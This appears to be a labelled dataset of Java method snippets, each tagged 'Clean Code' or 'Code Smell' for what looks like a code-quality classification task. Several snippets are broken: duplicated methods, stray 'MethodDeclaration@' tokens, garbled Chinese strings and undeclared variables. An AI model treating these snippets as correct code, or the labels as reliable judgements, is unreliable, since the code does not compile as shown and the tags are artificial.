"@Transactional @Override public void deleteAppraisalEmployeeByEmployeeId(List<Long> employeeIdList){
  for (  Long employeeId : employeeIdList) {
    Integer count=lambdaQuery().select(HrmAppraisalEmployee::getAppraisalEmployeeId).eq(HrmAppraisalEmployee::getEmployeeId,employeeId).eq(HrmAppraisalEmployee::getAppraisalStatus,AppraisalStatusEnum.RUNNING.getValue()).count().intValue();
    if (count >= 1) {
      throw new CrmException(HrmCodeEnum.APPRAISAL_PLAN_QUERY_PARAM_ERROR,""鏈夎�冩牳涓哗鏁堟垚缁╋紝鍒犻櫎澶辫触"");
    }
  }
  List<HrmAppraisalEmployee> appraisalEmployeeList=lambdaQuery().select(HrmAppraisalEmployee::getAppraisalEmployeeId).in(HrmAppraisalEmployee::getEmployeeId,employeeIdList).eq(HrmAppraisalEmployee::getAppraisalStatus,AppraisalStatusEnum.PLACE_ON_FILE.getValue()).list();
  if (CollectionUtil.isEmpty(appraisalEmployeeList)) {
    throw new CrmException(HrmCodeEnum.RESULT_NULL_ERROR);
  }
  List<Long> appraisalEmployeeId=appraisalEmployeeList.stream().map(HrmAppraisalEmployee::getAppraisalEmployeeId).collect(Collectors.toList());
  deleteAppraisalEmployeeById(appraisalEmployeeId);
}",0,Clean Code
"public int getQqMsgInList(){
  return this.qqMsgInList;
}
",0,Clean Code
"public void dispose(){
  for (  final ISelectionHistoryListener listener : listeners) {
    removeHistoryListener(listener);
  }
  snapshotList.clear();
  if (singleGraph != null) {
    singleGraph.getGraphs().getDiff().getMatches().removeListener(matchChangeListener);
  }
  if (combinedGraph != null) {
    combinedGraph.getGraphs().getDiff().getMatches().removeListener(matchChangeListener);
  }
  singleGraph=null;
  combinedGraph=null;
}
",0,Clean Code
"public void updateWith(Properties props){
  reset();
  boolean cursorPropExists=false;
  for (  Map.Entry<Object,Object> entries : props.entrySet()) {
    String key=(String)entries.getKey();
    String value=(String)entries.getValue();
    int colorIndex;
    if (key.equals(""foreground"")) {
      colorIndex=TextStyle.COLOR_INDEX_FOREGROUND;
    }
 else     if (key.equals(""background"")) {
      colorIndex=TextStyle.COLOR_INDEX_BACKGROUND;
    }
 else     if (key.equals(""cursor"")) {
      colorIndex=TextStyle.COLOR_INDEX_CURSOR;
      cursorPropExists=true;
    }
 else     if (key.startsWith(""color"")) {
      try {
        colorIndex=Integer.parseInt(key.substring(5));
      }
 catch (      NumberFormatException e) {
        throw new IllegalArgumentException(""Invalid property: '"" + key + ""'"");
      }
    }
 else {
      throw new IllegalArgumentException(""Invalid property: '"" + key + ""'"");
    }
    int colorValue=TerminalColors.parse(value);
    if (colorValue == 0)     throw new IllegalArgumentException(""Property '"" + key + ""' has invalid color: '""+ value+ ""'"");
    mDefaultColors[colorIndex]=colorValue;
  }
  if (!cursorPropExists)   setCursorColorForBackground();
}",0,Clean Code
"public String getFeedCoverUrl(){
  return this.feedCoverUrl;
}
",0,Clean Code
"public Object convertDateDefaultValue(RelationalColumn field){
  if (field.isOptional()) {
    return null;
  }
 else   if (field.hasDefaultValue()) {
    if (parseNullDefaultValue) {
      LocalDateTime dateTime=LocalDateTime.parse(DEFAULT_DATE_FORMAT_PATTERN,originalFormat);
      String columnType=field.typeName().toUpperCase();
switch (columnType.toUpperCase(Locale.ROOT)) {
case ""DATE"":
        return dateTime.format(dateFormatter);
case ""DATETIME"":
      return dateTime.format(datetimeFormatter);
case ""TIME"":
    return dateTime.format(timeFormatter);
case ""TIMESTAMP"":
  return dateTime.format(timestampFormatter);
}
}
}
return null;
}
",0,Clean Code
"public FloatParam(){
  super(SpacePropertyType.FLOAT);
}
@Builder public FloatParam(Boolean index){
  this();
  this.index=index;
}
",0,Clean Code
"@Input @Optional public abstract Property<Duration> getEvalTimeout();
",0,Clean Code
"@Override public int getId(){
  return EventID;
}
",0,Clean Code
"@Test public void should_use_persistTo_and_image_upscaling(){
  Path defaultTempDirPath=Paths.get(System.getProperty(""java.io.tmpdir""));
  VertexAiImageModel imagenModel=VertexAiImageModel.builder().endpoint(ENDPOINT).location(LOCATION).project(PROJECT).publisher(PUBLISHER).modelName(""imagegeneration@002"").sampleImageSize(1024).withPersisting().persistTo(defaultTempDirPath).maxRetries(3).build();
  Response<Image> imageResponse=imagenModel.generate(""A black bird looking itself in an antique mirror"");
  System.out.println(imageResponse.content().url());
  assertThat(imageResponse.content().url()).isNotNull();
  assertThat(new File(imageResponse.content().url())).exists();
  assertThat(imageResponse.content().base64Data()).isNotNull();
  VertexAiImageModel imagenModelForUpscaling=VertexAiImageModel.builder().endpoint(ENDPOINT).location(LOCATION).project(PROJECT).publisher(PUBLISHER).modelName(""imagegeneration@002"").sampleImageSize(4096).withPersisting().persistTo(defaultTempDirPath).maxRetries(3).build();
  Response<Image> upscaledImageResponse=imagenModelForUpscaling.edit(imageResponse.content(),"""");
  System.out.println(upscaledImageResponse.content().url());
  assertThat(upscaledImageResponse.content().url()).isNotNull();
  assertThat(new File(upscaledImageResponse.content().url())).exists();
  assertThat(upscaledImageResponse.content().base64Data()).isNotNull();
}",0,Clean Code
"@Override public final ChallengeStatus forName(final CharSequence value){
  if (value.length() == 15) {
    if (ProtoUtil.isEqual(""CHALLENGE_DOING"",value)) {
      return CHALLENGE_DOING;
    }
  }
  if (value.length() == 16) {
    if (ProtoUtil.isEqual(""CHALLENGE_FINISH"",value)) {
      return CHALLENGE_FINISH;
    }
    if (ProtoUtil.isEqual(""CHALLENGE_FAILED"",value)) {
      return CHALLENGE_FAILED;
    }
  }
  if (value.length() == 17) {
    if (ProtoUtil.isEqual(""CHALLENGE_UNKNOWN"",value)) {
      return CHALLENGE_UNKNOWN;
    }
  }
  return null;
}",0,Clean Code
"@Test public void autoConfigureWithCustomAWSCredentialAndRegionProvider(){
  new ApplicationContextRunner().withPropertyValues(""spring.ai.bedrock.aws.access-key="" + System.getenv(""AWS_ACCESS_KEY_ID""),""spring.ai.bedrock.aws.secret-key="" + System.getenv(""AWS_SECRET_ACCESS_KEY""),""spring.ai.bedrock.aws.region="" + Region.US_EAST_1.id()).withConfiguration(AutoConfigurations.of(TestAutoConfiguration.class,CustomAwsCredentialsProviderAndAwsRegionProviderAutoConfiguration.class)).run((context) -> {
    var awsCredentialsProvider=context.getBean(AwsCredentialsProvider.class);
    var awsRegionProvider=context.getBean(AwsRegionProvider.class);
    assertThat(awsCredentialsProvider).isNotNull();
    assertThat(awsRegionProvider).isNotNull();
    var credentials=awsCredentialsProvider.resolveCredentials();
    assertThat(credentials).isNotNull();
    assertThat(credentials.accessKeyId()).isEqualTo(""CUSTOM_ACCESS_KEY"");
    assertThat(credentials.secretAccessKey()).isEqualTo(""CUSTOM_SECRET_ACCESS_KEY"");
    assertThat(awsRegionProvider.getRegion()).isEqualTo(Region.AWS_GLOBAL);
  }
);
}",0,Clean Code
"protected FieldAccessorTable internalGetFieldAccessorTable(){
  return FieldDataSnapshotBuf.internal_static_FieldDataSnapshot_Data_fieldAccessorTable.ensureFieldAccessorsInitialized(Data.class,Builder.class);
}
protected FieldAccessorTable internalGetFieldAccessorTable(){
  return FieldDataSnapshotBuf.internal_static_FieldDataSnapshot_Data_fieldAccessorTable.ensureFieldAccessorsInitialized(Data.class,Builder.class);
}
",0,Clean Code
"@Override public void onClick(View v){
  int id=v.getId();
  if (id == binding.btnSetTts.getId()) {
    setTTS();
  }
 else   if (id == binding.btnKillBattery.getId()) {
    killBATTERY();
  }
 else   if (id == binding.ttsStyleDegreeAdd.getId()) {
    if (styleDegree < 200) {
      styleDegree++;
      updateView();
    }
  }
 else   if (id == binding.ttsStyleDegreeReduce.getId()) {
    if (styleDegree > 1) {
      styleDegree--;
      updateView();
    }
  }
 else   if (id == binding.ttsVoiceVolumeReduce.getId()) {
    if (volumeValue > 1) {
      volumeValue--;
      updateView();
    }
  }
 else   if (id == binding.ttsVoiceVolumeAdd.getId()) {
    if (volumeValue < 100) {
      volumeValue++;
      updateView();
    }
  }
}",0,Clean Code
"public int getCardStatusChomBoxIndex(String status){
  int index=0;
  if (status.equals(bundle.getString(""STATE_UNKNOWN""))) {
    index=1;
  }
 else   if (status.equals(bundle.getString(""STATE_NORMAL""))) {
    index=0;
  }
 else   if (status.equals(bundle.getString(""STATE_LOSE""))) {
    index=2;
  }
 else   if (status.equals(bundle.getString(""STATE_LOGOFF""))) {
    index=3;
  }
 else   if (status.equals(bundle.getString(""STATE_FREEZE""))) {
    index=4;
  }
 else   if (status.equals(bundle.getString(""STATE_ARREARS""))) {
    index=5;
  }
 else   if (status.equals(bundle.getString(""STATE_OVERDUE""))) {
    index=6;
  }
 else   if (status.equals(bundle.getString(""STATE_PREARREARS""))) {
    index=7;
  }
  return index;
}",0,Clean Code
"public GGProSearchRankInfo(GProSearchRankInfo gProSearchRankInfo){
  this.mInfo=gProSearchRankInfo;
}
",0,Clean Code
"public ValueContext value(){
  return getRuleContext(ValueContext.class,0);
}
public ValueContext value(){
  return getRuleContext(ValueContext.class,0);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@74165b7public List<ValueContext> value(){
  return getRuleContexts(ValueContext.class);
}
public ValueContext value(int i){
  return getRuleContext(ValueContext.class,i);
}",0,Clean Code
"public int getBackground(){
  return this.background;
}
",0,Clean Code
"private PackageResolver getPackageResolver(){
  var packageResolver=VmContext.get(null).getPackageResolver();
  assert packageResolver != null;
  return packageResolver;
}
",0,Clean Code
"public abstract boolean isCallGraphView();
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.multilabel.protos.ImmutableMultiLabelInfoProto)) {
    return super.equals(obj);
  }
  org.tribuo.multilabel.protos.ImmutableMultiLabelInfoProto other=(org.tribuo.multilabel.protos.ImmutableMultiLabelInfoProto)obj;
  if (!getLabelList().equals(other.getLabelList()))   return false;
  if (!getCountList().equals(other.getCountList()))   return false;
  if (!getIdList().equals(other.getIdList()))   return false;
  if (getUnknownCount() != other.getUnknownCount())   return false;
  if (getTotalCount() != other.getTotalCount())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof EnterRogueMapRoomCsReq)) {
    return false;
  }
  EnterRogueMapRoomCsReq other=(EnterRogueMapRoomCsReq)o;
  return bitField0_ == other.bitField0_ && (!hasSiteId() || siteId == other.siteId) && (!hasRoomId() || roomId == other.roomId);
}",0,Clean Code
"private static URI getBuiltInCertificates(){
  var resource=HttpClientBuilder.class.getResource(""/org/pkl/certs/PklCARoots.pem"");
  if (resource == null) {
    throw new HttpClientInitException(ErrorMessages.create(""cannotFindBuiltInCertificates""));
  }
  try {
    return resource.toURI();
  }
 catch (  URISyntaxException e) {
    throw new AssertionError(""unreachable"");
  }
}
",0,Clean Code
"private void init(){
  final JPanel panel=new JPanel(new BorderLayout());
  panel.setBorder(new EmptyBorder(1,1,1,1));
  final JTabbedPane tabbedPane=new JTabbedPane();
  tabbedPane.addTab(""General"",createGeneralTabPanel());
  tabbedPane.addTab(""Title"",createTitleTabPanel());
  panel.add(tabbedPane,BorderLayout.NORTH);
  panel.add(createButtonsPanel(),BorderLayout.SOUTH);
  add(panel,BorderLayout.CENTER);
}",0,Clean Code
"private ResConfigFlags readConfigFlags() throws IOException {
  int size=mIn.readInt();
  int read=28;
  if (size < 28) {
    throw new IOException(""Config size < 28"");
  }
  boolean isInvalid=false;
  short mcc=mIn.readShort();
  short mnc=mIn.readShort();
  char[] language=this.unpackLanguageOrRegion(mIn.readByte(),mIn.readByte(),'a');
  char[] country=this.unpackLanguageOrRegion(mIn.readByte(),mIn.readByte(),'0');
  byte orientation=mIn.readByte();
  byte touchscreen=mIn.readByte();
  int density=mIn.readShort();
  byte keyboard=mIn.readByte();
  byte navigation=mIn.readByte();
  byte inputFlags=mIn.readByte();
  mIn.skipBytes(1);
  short screenWidth=mIn.readShort();
  short screenHeight=mIn.readShort();
  short sdkVersion=mIn.readShort();
  mIn.skipBytes(2);
  byte screenLayout=0;
  byte uiMode=0;
  short smallestScreenWidthDp=0;
  if (size >= 32) {
    screenLayout=mIn.readByte();
    uiMode=mIn.readByte();
    smallestScreenWidthDp=mIn.readShort();
    read=32;
  }
  short screenWidthDp=0;
  short screenHeightDp=0;
  if (size >= 36) {
    screenWidthDp=mIn.readShort();
    screenHeightDp=mIn.readShort();
    read=36;
  }
  char[] localeScript=null;
  char[] localeVariant=null;
  if (size >= 48) {
    localeScript=readScriptOrVariantChar(4).toCharArray();
    localeVariant=readScriptOrVariantChar(8).toCharArray();
    read=48;
  }
  byte screenLayout2=0;
  if (size >= 52) {
    screenLayout2=mIn.readByte();
    mIn.skipBytes(3);
    read=52;
  }
  int exceedingSize=size - KNOWN_CONFIG_BYTES;
  if (exceedingSize > 0) {
    byte[] buf=new byte[exceedingSize];
    read+=exceedingSize;
    mIn.readFully(buf);
    BigInteger exceedingBI=new BigInteger(1,buf);
    if (exceedingBI.equals(BigInteger.ZERO)) {
      LOGGER.fine(String.format(Language.getPrefLanguage().getLocale(),""Config flags size > %d, but exceeding bytes are all zero, so it should be ok."",KNOWN_CONFIG_BYTES));
    }
 else {
      LOGGER.warning(String.format(Language.getPrefLanguage().getLocale(),""Config flags size > %d. Exceeding bytes: 0x%X."",KNOWN_CONFIG_BYTES,exceedingBI));
      isInvalid=true;
    }
  }
  int remainingSize=size - read;
  if (remainingSize > 0) {
    mIn.skipBytes(remainingSize);
  }
  return new ResConfigFlags(mcc,mnc,language,country,orientation,touchscreen,density,keyboard,navigation,inputFlags,screenWidth,screenHeight,sdkVersion,screenLayout,uiMode,smallestScreenWidthDp,screenWidthDp,screenHeightDp,localeScript,localeVariant,screenLayout2,isInvalid,size);
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)58);
    output.writeMessageNoTag(groupStateInfo);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeMessage(FieldNames.groupStateInfo,groupStateInfo);
  }
  output.endObject();
}",0,Clean Code
"@Override public void onCreateOptionsMenu(Menu menu,MenuInflater inflater){
  if (isOwnProfile && isInEditMode) {
    editSaveMenuItem=menu.add(0,R.id.save,0,R.string.save_changes);
    editSaveMenuItem.setIcon(R.drawable.ic_save_24px);
    editSaveMenuItem.setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS);
    editSaveMenuItem.setVisible(!isActionButtonInView());
    return;
  }
  if (relationship == null && !isOwnProfile)   return;
  inflater.inflate(isOwnProfile ? R.menu.profile_own : R.menu.profile,menu);
  menu.findItem(R.id.share).setTitle(R.string.share_user);
  if (isOwnProfile)   return;
  menu.findItem(R.id.mute).setTitle(getString(relationship.muting ? R.string.unmute_user : R.string.mute_user,account.getDisplayUsername()));
  menu.findItem(R.id.block).setTitle(makeRedString(getString(relationship.blocking ? R.string.unblock_user : R.string.block_user,account.getDisplayUsername())));
  menu.findItem(R.id.report).setTitle(makeRedString(getString(R.string.report_user,account.getDisplayUsername())));
  if (relationship.following)   menu.findItem(R.id.hide_boosts).setTitle(getString(relationship.showingReblogs ? R.string.hide_boosts_from_user : R.string.show_boosts_from_user));
 else   menu.findItem(R.id.hide_boosts).setVisible(false);
  if (!account.isLocal())   menu.findItem(R.id.block_domain).setTitle(makeRedString(getString(relationship.domainBlocking ? R.string.unblock_domain : R.string.block_domain,account.getDomain())));
 else   menu.findItem(R.id.block_domain).setVisible(false);
  menu.findItem(R.id.add_to_list).setVisible(relationship.following);
  if (relationship.following) {
    MenuItem notifications=menu.findItem(R.id.notifications);
    notifications.setVisible(true);
    notifications.setIcon(relationship.notifying ? R.drawable.ic_notifications_fill1_24px : R.drawable.ic_notifications_24px);
    notifications.setTitle(getString(relationship.notifying ? R.string.disable_new_post_notifications : R.string.enable_new_post_notifications,account.getDisplayUsername()));
  }
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && !UiUtils.isEMUI()) {
    menu.setGroupDividerEnabled(true);
  }
}",0,Clean Code
"@Override public String getOriginalFilename(){
  return this.originalFilename;
}
",0,Clean Code
"/** 
 * 鏌ョ湅寮曠敤鐨勬墍鏈夊浘鐗�
 * @param userId    鐢ㄦ埛ID
 * @param articleId 鏂囩珷ID
 */
List<ArticleReferenceEntity> listPic(@Param(""articleId"") Long articleId);
",0,Clean Code
"/** 
 * <code>optional uint32 group_id = 15;</code>
 * @param value the groupId to set
 * @return this
 */
public MazeProp setGroupId(final int value){
  bitField0_|=0x00000004;
  groupId=value;
  return this;
}",0,Clean Code
"public static String serviceTaskFinish(String bizId){
  return RpcUtil.request(""com.alipay.adtask.biz.mobilegw.service.task.finish"",""[{\""bizId\"":\"""" + bizId + ""\""}]"");
}
",0,Clean Code
"@Override public IKernelMsgService getMsgService(){
  return null;
}
IKernelMsgService getMsgService();
",0,Clean Code
"public int getSysMicStatus(){
  return this.sysMicStatus;
}
",0,Clean Code
"@Override public void readToUnsafe(Object target,long targetPointer,int numBytes){
}
",0,Clean Code
"@Override protected void setupReader(){
  mMultiFormatReader=new MultiFormatReader();
  if (mBarcodeType == BarcodeType.ONE_DIMENSION) {
    mMultiFormatReader.setHints(QRCodeDecoder.ONE_DIMENSION_HINT_MAP);
  }
 else   if (mBarcodeType == BarcodeType.TWO_DIMENSION) {
    mMultiFormatReader.setHints(QRCodeDecoder.TWO_DIMENSION_HINT_MAP);
  }
 else   if (mBarcodeType == BarcodeType.ONLY_QR_CODE) {
    mMultiFormatReader.setHints(QRCodeDecoder.QR_CODE_HINT_MAP);
  }
 else   if (mBarcodeType == BarcodeType.ONLY_CODE_128) {
    mMultiFormatReader.setHints(QRCodeDecoder.CODE_128_HINT_MAP);
  }
 else   if (mBarcodeType == BarcodeType.ONLY_EAN_13) {
    mMultiFormatReader.setHints(QRCodeDecoder.EAN_13_HINT_MAP);
  }
 else   if (mBarcodeType == BarcodeType.HIGH_FREQUENCY) {
    mMultiFormatReader.setHints(QRCodeDecoder.HIGH_FREQUENCY_HINT_MAP);
  }
 else   if (mBarcodeType == BarcodeType.CUSTOM) {
    mMultiFormatReader.setHints(mHintMap);
  }
 else {
    mMultiFormatReader.setHints(QRCodeDecoder.ALL_HINT_MAP);
  }
}",0,Clean Code
"/** 
 * <pre> isnt used </pre> <code>repeated uint32 archive_missing_equipment_id_list = 14;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedInt getMutableArchiveMissingEquipmentIdList(){
  bitField0_|=0x00000004;
  return archiveMissingEquipmentIdList;
}",0,Clean Code
"public static List<String> parseAuthors(Object obj) throws JsonParseException {
  if (!(obj instanceof JsArray)) {
    throw new FormatException(""array"",obj.getClass());
  }
  var ret=new ArrayList<String>(arr.size());
  for (  var elem : arr) {
    if (!(elem instanceof String)) {
      throw new FormatException(""string"",elem.getClass());
    }
    ret.add(string);
  }
  return ret;
}
",0,Clean Code
"private static String convertLang(String text){
  if (""chi"".equals(text))   return ""zh"";
  if (""cze"".equals(text))   return ""cs"";
  if (""dut"".equals(text))   return ""nl"";
  if (""fre"".equals(text))   return ""fr"";
  if (""ger"".equals(text))   return ""de"";
  if (""gre"".equals(text))   return ""el"";
  if (""ice"".equals(text))   return ""is"";
  if (""rum"".equals(text))   return ""ro"";
  return text;
}
",0,Clean Code
"public ArrayList<TLRPC.PrivacyRule> getPrivacyRules(int type){
switch (type) {
case PRIVACY_RULES_TYPE_LASTSEEN:
    return lastseenPrivacyRules;
case PRIVACY_RULES_TYPE_INVITE:
  return groupPrivacyRules;
case PRIVACY_RULES_TYPE_CALLS:
return callPrivacyRules;
case PRIVACY_RULES_TYPE_P2P:
return p2pPrivacyRules;
case PRIVACY_RULES_TYPE_PHOTO:
return profilePhotoPrivacyRules;
case PRIVACY_RULES_TYPE_BIO:
return bioPrivacyRules;
case PRIVACY_RULES_TYPE_BIRTHDAY:
return birthdayPrivacyRules;
case PRIVACY_RULES_TYPE_FORWARDS:
return forwardsPrivacyRules;
case PRIVACY_RULES_TYPE_PHONE:
return phonePrivacyRules;
case PRIVACY_RULES_TYPE_ADDED_BY_PHONE:
return addedByPhonePrivacyRules;
case PRIVACY_RULES_TYPE_VOICE_MESSAGES:
return voiceMessagesRules;
}
return null;
}",0,Clean Code
"private void emitDoubleQuotedString(String str){
  builder.append('""');
  escaper.escape(str,builder);
  builder.append('""');
}
",0,Clean Code
"@Override protected int resolveNativeType(String typeName){
  String upperCaseTypeName=typeName.toUpperCase();
  if (upperCaseTypeName.startsWith(""JSON"")) {
    return Types.VARCHAR;
  }
  if (upperCaseTypeName.startsWith(""NCHAR"")) {
    return Types.NCHAR;
  }
  if (upperCaseTypeName.startsWith(""NVARCHAR2"")) {
    return Types.NVARCHAR;
  }
  if (upperCaseTypeName.startsWith(""TIMESTAMP"")) {
    if (upperCaseTypeName.contains(""WITH TIME ZONE"")) {
      return TYPE_TIMESTAMP_WITH_TIME_ZONE;
    }
    if (upperCaseTypeName.contains(""WITH LOCAL TIME ZONE"")) {
      return TYPE_TIMESTAMP_WITH_LOCAL_TIME_ZONE;
    }
    return Types.TIMESTAMP;
  }
  if (upperCaseTypeName.startsWith(""INTERVAL"")) {
    if (upperCaseTypeName.contains(""TO MONTH"")) {
      return TYPE_INTERVAL_YEAR_TO_MONTH;
    }
    if (upperCaseTypeName.contains(""TO SECOND"")) {
      return TYPE_INTERVAL_DAY_TO_SECOND;
    }
  }
  return Column.UNSET_INT_VALUE;
}",0,Clean Code
"public static ServerPrefs parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new ServerPrefs(),data).checkInitialized();
}
public static ServerPrefs parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ServerPrefs(),input).checkInitialized();
}
public static ServerPrefs parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ServerPrefs(),input).checkInitialized();
}
",0,Clean Code
"private boolean handleStdCin(AbsEnv absEnv,CallGraph callGraph,Address fromAddress,Function callee,Function caller,SymbolIterator stdCins,SymbolIterator stdioWidths){
  String name=callee.getName();
  if (!name.equals(""operator>>"")) {
    return false;
  }
  if (callee.getParameterCount() < 1) {
    Logging.debug(""Not enough parameters for \"""" + name + ""()\"" function"");
    return false;
  }
  boolean result=false;
  KSet argKSet=getParamKSet(callee,0,absEnv);
  if (!argKSet.isNormal()) {
    return false;
  }
  Logging.debug(""Checking abstract values for "" + argKSet.toString());
  for (  AbsVal argAbsVal : argKSet) {
    if (argAbsVal.isBigVal() || !argAbsVal.getRegion().isGlobal()) {
      continue;
    }
    long address=argAbsVal.getValue();
    for (    Symbol stdcin : stdCins) {
      if (stdcin.getAddress().getUnsignedOffset() == address) {
        result=true;
      }
    }
  }
  for (  Symbol stdiowidth : stdioWidths) {
    if (stdiowidth.getParentNamespace().getName().equals(""ios_base"")) {
      Logging.debug(""Has a reference to \""std::ios_base::width()\"" at "" + stdiowidth.getAddress().toString());
      if (hasPathToSymbol(callGraph,caller,stdiowidth)) {
        result=false;
      }
    }
  }
  if (result) {
    CWEReport report=getNewReport(""\""std::cin >> buffer\"" pattern found for \"""" + name + ""()\"" call"").setAddress(fromAddress);
    Logging.report(report);
  }
  return result;
}",1,Code Smell
"public void restoreInitialSettings(){
  firstSortCombo.setSelectItem(initialFirstCriterion.toString(),initialFirstOrder);
  secondSortCombo.setSelectItem(initialSecondCriterion.toString(),initialSecondOrder);
  thirdSortCombo.setSelectItem(initialThirdCriterion.toString(),initialThirdOrder);
  fourthSortCombo.setSelectItem(initialFourthCriterion.toString(),initialFourthOrder);
  fifthSortCombo.setSelectItem(initialFifthCriterion.toString(),initialFifthOrder);
}
",0,Clean Code
"@Test public void testSpop(){
  jedisCluster.spop(""key"");
  jedisCluster.spop(""key"",1337);
}",0,Clean Code
"/** 
 * Returns an expression parsed from user-defined YAML that can be evaluated against an input of type  {@code <I>} andreturns output of type  {@code <O>}.
 * @param object           a map or list of tag criteria
 * @param tagValueProducer a TagValueProducer
 * @param < I >              Input type of the expression
 * @param < O >              Return type of the expression
 */
public static <I extends ScriptContext,O>ConfigExpression<I,O> parse(Object object,TagValueProducer tagValueProducer,ScriptEnvironment<I> context,Class<O> outputClass){
  return new ConfigExpressionParser<>(tagValueProducer,context).parse(object,outputClass).simplify();
}
private <O>ConfigExpression<I,O> parse(Object object,Class<O> output){
  if (object == null) {
    return ConfigExpression.constOf(null);
  }
 else   if (ConfigExpressionScript.isScript(object)) {
    return ConfigExpression.script(signature(output),ConfigExpressionScript.extractScript(object));
  }
 else   if (object instanceof Collection<?>) {
    return parseMatch(collection,true,output);
  }
 else   if (object instanceof Map<?,?>) {
    if (map.get(""type"") != null) {
      var map2=new HashMap<>(map);
      var type=map2.remove(""type"");
      DataType dataType=DataType.from(Objects.toString(type));
      if (!dataType.id().equals(type)) {
        throw new ParseException(""Unrecognized datatype '"" + type + ""' supported values: ""+ Stream.of(DataType.values()).map(DataType::id).collect(Collectors.joining("", "")));
      }
      var child=parse(map2,Object.class);
      return cast(signature(output),child,dataType);
    }
 else {
      var keys=map.keySet();
      if (keys.equals(Set.of(""coalesce"")) && map.get(""coalesce"") instanceof Collection<?>) {
        return coalesce(cases.stream().map(item -> parse(item,output)).toList());
      }
 else       if (keys.equals(Set.of(""match""))) {
        return parseMatch(map.get(""match""),true,output);
      }
 else       if (keys.equals(Set.of(""default_value"",""overrides""))) {
        var match=parseMatch(map.get(""overrides""),false,output);
        var defaultValue=parse(map.get(""default_value""),output);
        return match.withDefaultValue(defaultValue);
      }
 else       if (keys.equals(Set.of(""tag_value""))) {
        var tagProducer=parse(map.get(""tag_value""),String.class);
        return getTag(signature(output),tagProducer);
      }
 else       if (keys.equals(Set.of(""arg_value""))) {
        var keyProducer=parse(map.get(""arg_value""),String.class);
        return getArg(signature(output),keyProducer);
      }
 else       if (keys.equals(Set.of(""value""))) {
        return parse(map.get(""value""),output);
      }
      try {
        return parseMatch(map,true,output);
      }
 catch (      ParseException e) {
        throw new ParseException(""Failed to parse: "" + map);
      }
    }
  }
 else {
    object=unescape(object);
    return constOf(TypeConversion.convert(object,output));
  }
}",0,Clean Code
"@Override public SetAssistAvatarScRsp mergeFrom(final SetAssistAvatarScRsp other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasAvatarId()) {
    setAvatarId(other.avatarId);
  }
  if (other.hasRetcode()) {
    setRetcode(other.retcode);
  }
  if (other.hasAvatarIdList()) {
    getMutableAvatarIdList().addAll(other.avatarIdList);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@6a707c5c!org.eclipse.jdt.core.dom.MethodDeclaration@73f747d3",0,Clean Code
"@Override public DestroyItemCsReq create(){
  return DestroyItemCsReq.newInstance();
}
",0,Clean Code
"public SparseIntArray createColors(int currentAccount,int index){
  SparseIntArray currentColors;
  Theme.ThemeInfo themeInfo=getThemeInfo(index);
  Theme.ThemeAccent accent=null;
  if (themeInfo == null) {
    int settingsIndex=getSettingsIndex(index);
    TLRPC.TL_theme tlTheme=getTlTheme(index);
    Theme.ThemeInfo baseTheme=Theme.getTheme(Theme.getBaseThemeKey(tlTheme.settings.get(settingsIndex)));
    themeInfo=new Theme.ThemeInfo(baseTheme);
    accent=themeInfo.createNewAccent(tlTheme,currentAccount,true,settingsIndex);
    themeInfo.setCurrentAccentId(accent.id);
  }
 else {
    if (themeInfo.themeAccentsMap != null) {
      accent=themeInfo.themeAccentsMap.get(items.get(index).accentId);
    }
  }
  SparseIntArray currentColorsNoAccent;
  String[] wallpaperLink=new String[1];
  if (themeInfo.pathToFile != null) {
    currentColorsNoAccent=Theme.getThemeFileValues(new File(themeInfo.pathToFile),null,wallpaperLink);
  }
 else   if (themeInfo.assetName != null) {
    currentColorsNoAccent=Theme.getThemeFileValues(null,themeInfo.assetName,wallpaperLink);
  }
 else {
    currentColorsNoAccent=new SparseIntArray();
  }
  items.get(index).wallpaperLink=wallpaperLink[0];
  if (accent != null) {
    currentColors=currentColorsNoAccent.clone();
    accent.fillAccentColors(currentColorsNoAccent,currentColors);
  }
 else {
    currentColors=currentColorsNoAccent;
  }
  SparseIntArray fallbackKeys=Theme.getFallbackKeys();
  for (int i=0; i < fallbackKeys.size(); i++) {
    int colorKey=fallbackKeys.keyAt(i);
    int fallbackKey=fallbackKeys.valueAt(i);
    if (currentColors.indexOfKey(colorKey) < 0) {
      int fallbackIndex=currentColors.indexOfKey(fallbackKey);
      if (fallbackIndex >= 0) {
        currentColors.put(colorKey,currentColors.valueAt(fallbackIndex));
      }
    }
  }
  int[] defaultColors=Theme.getDefaultColors();
  for (int i=0; i < defaultColors.length; i++) {
    if (currentColors.indexOfKey(i) < 0) {
      currentColors.put(i,defaultColors[i]);
    }
  }
  return currentColors;
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code Quest}
 */
public static Quest newInstance(){
  return new Quest();
}
",0,Clean Code
"public String getUploaderName(){
  return this.uploaderName;
}
",0,Clean Code
"@Test public void testCheckClassWildcard(){
{
    Fury fury=Fury.builder().requireClassRegistration(false).build();
    AllowListChecker checker=new AllowListChecker(AllowListChecker.CheckLevel.STRICT);
    fury.getClassResolver().setClassChecker(checker);
    checker.addListener(fury.getClassResolver());
    assertThrows(InsecureException.class,() -> fury.serialize(new AllowListCheckerTest()));
    checker.allowClass(""org.apache.fury.*"");
    byte[] bytes=fury.serialize(new AllowListCheckerTest());
    checker.disallowClass(""org.apache.fury.*"");
    assertThrows(InsecureException.class,() -> fury.serialize(new AllowListCheckerTest()));
